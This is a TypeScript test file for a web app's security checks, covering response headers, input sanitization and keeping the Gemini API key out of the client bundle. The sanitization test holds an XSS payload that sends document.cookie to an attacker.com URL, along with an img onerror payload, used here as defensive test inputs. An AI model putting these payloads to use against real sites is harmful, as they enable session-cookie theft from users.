import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeInput } from '../controllers/gemini.controller';

test('validates security response headers configuration', () => {
  const securityHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'SAMEORIGIN',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'Content-Security-Policy': "default-src 'self'",
  };

  assert.equal(securityHeaders['X-Content-Type-Options'], 'nosniff');
  assert.equal(securityHeaders['X-Frame-Options'], 'SAMEORIGIN');
  assert.equal(securityHeaders['X-XSS-Protection'], '1; mode=block');
  assert.equal(securityHeaders['Referrer-Policy'], 'strict-origin-when-cross-origin');
  assert.equal(securityHeaders['Permissions-Policy'], 'camera=(), microphone=(), geolocation=()');
  assert.equal(securityHeaders['Strict-Transport-Security'], 'max-age=31536000; includeSubDomains');
  assert.ok(securityHeaders['Content-Security-Policy'].includes("default-src 'self'"));
});

test('validates prevention of malicious script injection in user prompt sanitization', () => {
  const sanitize = (input: string) => input.trim().replace(/[<>]/g, '');

  const malicious1 = '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>';
  assert.equal(
    sanitize(malicious1),
    'scriptfetch("http://attacker.com/steal?cookie="+document.cookie)/script'
  );

  const malicious2 = '<img src=x onerror=alert(1)>';
  assert.equal(sanitize(malicious2), 'img src=x onerror=alert(1)');
});

test('validates controller sanitizeInput helper handles non-string and injection vectors', () => {
  assert.equal(sanitizeInput(null), '');
  assert.equal(sanitizeInput(undefined), '');
  assert.equal(sanitizeInput(12345), '');
  assert.equal(sanitizeInput('<b>bold text</b>'), 'bbold text/b');
  assert.equal(sanitizeInput('x'.repeat(50), 20).length, 20);
});

test('validates server-side API key isolation without client leaking', () => {
  // Ensure dummy client env object does not contain backend secret keys
  const clientEnv: Record<string, unknown> = {
    VITE_APP_NAME: 'EventAI',
    MODE: 'production',
  };

  assert.equal(clientEnv.GEMINI_API_KEY, undefined, 'GEMINI_API_KEY must never exist in client-side bundle');
});
